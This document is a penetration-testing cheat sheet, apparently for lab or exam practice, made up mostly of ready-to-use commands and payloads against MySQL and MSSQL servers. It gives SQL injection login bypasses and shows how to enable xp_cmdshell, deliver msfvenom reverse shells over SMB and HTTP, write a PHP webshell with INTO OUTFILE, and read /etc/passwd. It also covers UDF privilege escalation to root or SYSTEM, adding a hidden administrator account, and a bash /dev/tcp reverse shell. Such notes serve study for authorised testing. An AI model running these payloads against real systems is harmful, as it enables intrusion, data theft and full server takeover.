# MySQL

**<u>SQL Injection:</u>**

> " OR 1=1 -- blah
>
> " OR 1=1 #
>
> ' OR 1=1 #
>
> ' OR 1=1 -- blah



**<u>Enumerating an SQL server:</u>**

```mysql
# Logging into to MySql with password
mysql --host=192.168.1.101 -u root -p Password123!
# Logging into MySql requesting a password prompt
mysql --host=192.168.1.101 -u root -p

#Dummp all databases
mysqldump -u root -p Password123! --all-databases > all_db_backup.sql

#interacting with mysql
show databases;

use <database name>

show tables;

select * from <table_name>

-- get version
SELECT @@version;
-- get databases
SELECT name FROM master.dbo.sysdatabases;
-- get users
select * FROM master.sys.server_principals;

SELECT HOST_NAME(), USER_NAME(), SYSTEM_USER, @@VERSION, @@SERVERNAME, @@LANGUAGE
SELECT DB_NAME()
SELECT name FROM sysusers WHERE name = USER_NAME();
```



<u>**Reverse Shell:**</u>

Next check for easy access to the xp_cmdshell method for getting code execution on the target:

```mysql
-- check if xp_cmdshell is enabled
SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS CMDSHELL_ENABLED FROM sys.configurations WHERE name = N'xp_cmdshell';
-- check if current user is an admin
SELECT IS_SRVROLEMEMBER('sysadmin') as isAdmin;
-- check current user
SELECT SYSTEM_USER;

-- enable xp_cmdshell if not enabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- test if it works
EXEC master..xp_cmdshell 'whoami';
```

​        ◦ NOTE: if xp_cmdshell did not work, check if it needs to be registered or find another way: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/

```bash
# on kali, make a new payload to catch the reverse shell
msfvenom -p windows/shell_reverse_tcp \
         LHOST=$my-ip \
         LPORT=443 \
         -a x86 --platform windows \
         -e x86/shikata_ga_nai \
         -f exe \
         -o root.exe
# on kali, start a new listener
nc -nvlp 443
# on kali, host payload
sudo impacket-smbserver my-server .
# on target, in mssql-cli connection, download & execute payload
EXEC master..xp_cmdshell '\\$my-ip\my-server\root.exe';
```



If web injection works, follow up with the specific type of injection: https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

**<u>LOAD_FILE():</u>**

Using the SQL function `LOAD_FILE()` (https://mariadb.com/kb/en/load_file/)

```bash
1' UNION SELECT 'file:',LOAD_FILE('C:/xampp/htdocs/admin/backdoorchecker.php'),'?' #
load_file('/etc/passwd')#
load_file('c:\\Windows\\System32\\Drivers\\etc\\hosts')#
```

**<u>Add user:</u>**

```bash
#Try to create a new admin user through sql inject:
'; EXEC sp_addlogin 'pwn','password'; EXEC master.dbo.sp_addsrvrolemember 'pwn','sysadmin' -- escape 
```

**<u>Uploading a PHP Reverse Shell:</u>**

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MySQL Injection.md#mysql-write-a-shell)

```bash
echo '<?php echo shell_exec($_REQUEST["c"]); ?>' > pwn.php
python3 -c "import binascii;print('0x'+binascii.hexlify(open('pwn.php','rb').read()).decode())"
```

Take the above hex output and use it in the following SQL query:

```mysql
SELECT description from time_types WHERE id=69 UNION ALL SELECT 0x3c3f706870206563686f207368656c6c5f6578656328245f524551554553545b2263225d293b203f3e0a INTO OUTFILE '/var/www/html/bubba.php'#
```

This becomes the following SQL injection

> ```
> http://10.11.1.252:8000/edit_type.php?type_id=9999 UNION ALL SELECT 0x3c3f706870206563686f207368656c6c5f6578656328245f524551554553545b2263225d293b203f3e0a INTO OUTFILE '/var/www/html/pwn.php'#
> ```

After running this, test the webshell as follows:

```bash
curl -s -G http://10.11.1.252:8000/pwn.php --data-urlencode 'c=whoami'
```



**<u>MySQL Linux Priv Esc using UDF:</u>**

So the MySQL instance is running as root . However, note that in the above output, root is just a user in the database and not root on the system. It is from the process listing that shows MySQL is running as root on the system. Since MySQL is running as system root and root access is given to the MySQL database, it should be possible to load a UDF file into MySQL that will execute code as root on the system:

- https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
- https://recipeforroot.com/mysql-to-system-root/

Metasploit and SQLMap have pre-compiled versions of thus UDF shared library:

- https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
- https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/

First get the target plugin directory:

```mysql
show variables like 'plugin%';
```

Since the variable is empty, that means that MySQL will look in directories searched by the system's dynamic linker. This is usually /usr/lib/. Since MySQL has permissions of system root, use MySQL to create the library for it to load. Download an x86 version (run uname -a to get target architecture type) and then import it into the target SQL server:

```bash
# on kali, download & host library
wget https://github.com/rapid7/metasploit-framework/raw/master/data/exploits/mysql/lib_mysqludf_sys_32.so
sudo python3 -m http.server 80
# on target, download library
wget -O /tmp/pwn.so http://192.168.119.236/lib_mysqludf_sys_32.so
# on target, connect to local SQL server
mysql -u root -h 127.0.0.1
```

Now load the library into MySQL:

```mysql
use mysql;
select load_file('/tmp/bubba.so') into dumpfile '/usr/lib/bubba.so';
create function sys_exec returns int soname 'bubba.so';
create function sys_set returns int soname 'bubba.so';     # just an extra method but not used
create function sys_get returns string soname 'bubba.so';  # just an extra method but not used
create function sys_eval returns string soname 'bubba.so'; # just an extra method but not used
create function sys_bineval returns int soname 'bubba.so'; # just an extra method but not used
select sys_exec('id > /tmp/out; chmod 666 /tmp/out;');
quit
```

Use this to get a reverse shell as root:

```bash
# on kali, generate a new payload
msfvenom -p linux/x86/shell_reverse_tcp \
         LHOST=192.168.119.131 \
         LPORT=80 \
         -f elf \
         -o root.elf
# on kali, host payload for download
sudo python3 -m http.server 80
# on target, download and prepare payload
wget -O /tmp/root.elf http://192.168.119.131/root.elf
chmod +x /tmp/root.elf
# on kali, **stop Python HTTP server** and start listener
sudo nc -nvlp 80
# on target, have MySQL execute payload
mysql -u root -h 127.0.0.1
```

Then run the following commands in MySQL:

```mysql
select * from mysql.func; # make sure function is there
select sys_exec('/tmp/root.elf &');
quit
```

**<u>MySQL Windows Priv Esc using UDF:</u>**

If we are exploiting a 64 bit version of Windows, we need to download the 64 bit UDF library from the SQLMap program. You can download it [here](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/windows/64). The file should be called **lib_mysqludf_sys.dll** and we need to copy it to the target location. This could be in a user folder or a temp directory.

After we have successfully copied the file to the server, we will be running a series of commands to load the file into a new row, dump the contents of that row to a new file, create a new function to point to the new file, then execute the function and hopefully get **SYSTEM**. Below is the series of commands we will be running after connecting to MySql:

```mysql
USE mysql;
CREATE TABLE potato(line blob);
INSERT INTO potato values(load_file('C://Users//Bob//Desktop//lib_mysqludf_sys.dll'));
SELECT * FROM mysql.potato INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user hacker Password123! /add");
SELECT sys_exec("net localgroup Administrators hacker /add");
```

This will add a new user **hacker** to the **Administrators** group on the computer. If we want to do this for a 32 bit Windows machine, the steps are the same but we need to download the [32 bit UDF library instead](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/windows/32).

**<u>MySql 4x/5.0 Exploit</u>**

If there is a MySql server that is version 4.x to 5.0, there is a known exploit to get **root** on the system. The proof of concept code can be found [here](https://www.exploit-db.com/exploits/1518).

First, on our Kali machine we need to download the file from Exploit-DB and compile the code:

```bash
wget -O pizza.c https://www.exploit-db.com/download/1518

gcc –g –shared –Wl,–soname,pizza.so –o pizza.so pizza.c –lc
```

Now we should have a **.so** file that we need to transfer to the target machine. Use your favorite file transfer method. Put it in the **/tmp/** directory of the target machine for now.

Change the permissions of the file:

```bash
chmod 777 pizza.so
```

Now login to the MySql Database:

```bash
mysql -u root -p Password123!
```

Now we will follow the instructions in the exploit to trigger the vulnerability with our new **.so** file. Before running the commands make sure you have a netcat listener running on your Kali machine:

```mysql
mysql> create table foo(line blob);
mysql> insert into foo values(load_file(‘/tmp/pizza.so’));
mysql> select * from foo into dumpfile ‘/usr/lib/mysql/plugin/pizza.so’;
mysql> create function do_system returns integer soname ‘pizza.so’;
mysql> select do_system(‘bash -i >& /dev/tcp/10.0.0.1/443 0>&1’);
```

The last command should run the reverse shell and you should now have root shell on your machine.